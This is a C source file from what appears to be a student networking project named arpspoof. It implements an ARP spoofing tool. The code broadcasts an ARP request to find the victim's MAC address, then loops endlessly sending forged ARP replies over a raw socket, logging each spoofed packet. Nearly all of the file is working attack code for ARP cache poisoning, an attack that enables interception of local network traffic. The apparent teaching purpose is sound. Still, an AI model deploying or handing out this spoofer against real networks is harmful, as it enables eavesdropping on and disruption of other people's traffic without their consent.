/*
** EPITECH PROJECT, 2019
** print
** File description:
** print
*/

#include "arpspoof.h"

int send_arp(data_t *data)
{
    unsigned char buffer[60];
    struct ethhdr *send_req = (struct ethhdr *)buffer;
    arp_header_t *arp_req = (arp_header_t *)(buffer + 14);
    struct sockaddr_ll socket_address;

    fill_sockaddr_ll(&socket_address, data);
    memcpy(send_req->h_dest, data->mac_dest, 6);
    memcpy(send_req->h_source, data->mac_source, 6);
    memcpy(arp_req->target_mac, data->mac_dest, 6);
    memcpy(arp_req->sender_mac, data->mac_source, 6);
    send_req->h_proto = htons(ETH_P_ARP);
    set_arp_stuff_request(arp_req);
    memcpy(arp_req->sender_ip, &data->ip_source, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &data->ip_dest, sizeof(uint32_t));
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    while (1) {
        sleep(1);
        sendto(fd, buffer, 42, 0,
            (struct sockaddr *)&socket_address, sizeof(socket_address));
        fprintf(stderr, "Spoofed packet sent to \'%s\'\n", target_g);
    }
}

int read_arp(data_t *data)
{
    unsigned char buffer_receiv[60];
    recvfrom(data->arp_fd, buffer_receiv, 60, 0, NULL, NULL);
    arp_header_t *arp_resp = (arp_header_t *)(buffer_receiv + 14);
    memcpy(data->mac_dest, arp_resp->sender_mac, 6);
    fprintf(stderr, "Found victim's MAC address: ");
    fprintf(stderr, "\'%02x:", arp_resp->sender_mac[0]);
    fprintf(stderr, "%02x:", arp_resp->sender_mac[1]);
    fprintf(stderr, "%02x:", arp_resp->sender_mac[2]);
    fprintf(stderr, "%02x:", arp_resp->sender_mac[3]);
    fprintf(stderr, "%02x:", arp_resp->sender_mac[4]);
    fprintf(stderr, "%02x\'\n", arp_resp->sender_mac[5]);
    send_arp(data);
    return (0);
}

void arp_run(data_t *data)
{
    unsigned char buffer[60];
    struct ethhdr *send_req = (struct ethhdr *)buffer;
    arp_header_t *arp_req = (arp_header_t *)(buffer + 14);
    struct sockaddr_ll socket_address;

    fill_sockaddr_ll(&socket_address, data);
    memset(send_req->h_dest, 0xff, 6);
    memcpy(send_req->h_source, data->mac_source, 6);
    send_req->h_proto = htons(ETH_P_ARP);
    set_arp_stuff_response(arp_req);
    memset(arp_req->target_mac, 0xff, 6);
    memcpy(arp_req->sender_mac, data->mac_source, 6);
    memcpy(arp_req->sender_ip, &data->ip_source, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &data->ip_dest, sizeof(uint32_t));
    memcpy(socket_address.sll_addr, data->mac_source, 6);
    sendto(data->arp_fd, buffer, 42, 0,
        (struct sockaddr *)&socket_address, sizeof(socket_address));
    read_arp(data);
}

void print_broadcast(data_t *data)
{
    unsigned char buffer[60];
    struct ethhdr *send_req = (struct ethhdr *)buffer;
    arp_header_t *arp_req = (arp_header_t *)(buffer + 14);

    memset(send_req->h_dest, 0xff, 6);
    memcpy(send_req->h_source, data->mac_source, 6);
    send_req->h_proto = htons(ETH_P_ARP);
    memset(arp_req->target_mac, 0xff, 6);
    memcpy(arp_req->sender_mac, data->mac_source, 6);
    arp_req->hardware_type = htons(1);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = 6;
    arp_req->protocol_len = 4;
    arp_req->opcode = htons(0x01);
    memcpy(arp_req->sender_ip, &data->ip_source, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &data->ip_dest, sizeof(uint32_t));
    print_arp_packet(send_req, arp_req);
}

void print_spoof(data_t *data)
{
    unsigned char buffer[60];
    struct ethhdr *send_req = (struct ethhdr *)buffer;
    arp_header_t *arp_req = (arp_header_t *)(buffer + 14);

    memcpy(send_req->h_dest, data->mac_dest, 6);
    memcpy(send_req->h_source, data->mac_source, 6);
    memcpy(arp_req->target_mac, data->mac_dest, 6);
    memcpy(arp_req->sender_mac, data->mac_source, 6);
    send_req->h_proto = htons(ETH_P_ARP);
    arp_req->hardware_type = htons(1);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = 6;
    arp_req->protocol_len = 4;
    arp_req->opcode = htons(0x02);
    memcpy(arp_req->sender_ip, &data->ip_source, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &data->ip_dest, sizeof(uint32_t));
    print_arp_packet(send_req, arp_req);
}